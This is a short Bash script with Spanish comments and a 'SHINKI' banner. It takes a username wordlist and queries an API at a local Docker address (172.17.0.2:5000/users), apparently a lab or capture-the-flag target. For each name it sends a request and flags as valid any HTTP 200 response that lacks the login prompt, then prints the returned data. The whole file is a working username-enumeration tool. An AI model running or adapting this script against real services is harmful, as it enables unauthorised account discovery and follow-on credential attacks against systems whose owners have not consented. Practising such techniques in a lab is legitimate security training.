#!/bin/bash

# Definición de colores para la salida
AZUL="\033[1;34m"
VERDE="\033[1;32m"
ROJO="\033[1;31m"
RESET="\033[0m"
BLANCO_CLARO="\033[1;97m"

# Mostrar el banner
echo -e "${AZUL}"
cat << "EOF"
  _____   _   _   _____   _   _   _  __  _____   
 / ____| | | | | |_   _| | \ | | | |/ / |_   _|  
| (___   | |_| |   | |   |  \| | | ' /    | |    
 \___ \  |  _  |   | |   | . ` | |  <     | |    
 ____) | | | | |  _| |_  | |\  | | . \   _| |_   
|_____/  |_| |_| |_____| |_| \_| |_|\_\ |_____|  
EOF
echo -e "${RESET}"

# Diccionario de usuarios
diccionario=$1

# Leer el archivo línea por línea
while IFS= read -r usuario; do

    usuario=$(echo "$usuario" | sed 's/""/ /g')

    # Realizar la solicitud GET a la API
    response=$(curl -s -o response.txt -w "%{http_code}" --get --data-urlencode "username=$usuario" "http://172.17.0.2:5000/users")


    sleep 0.0001

    if [[ "$response" -ne 200 ]] || grep -q "Enter your username" response.txt ; then
        # Si el código HTTP no es 200 (exitoso), lo tratamos como un error
        echo -e "${ROJO}Error en la solicitud para $usuario${RESET}"
        continue

    else

        # Si el usuario es encontrado, mostrar el usuario
        echo -e "${VERDE}Usuario valido para $usuario${RESET}"
        cat response.txt
        exit 1

    fi
    
done < "$diccionario"
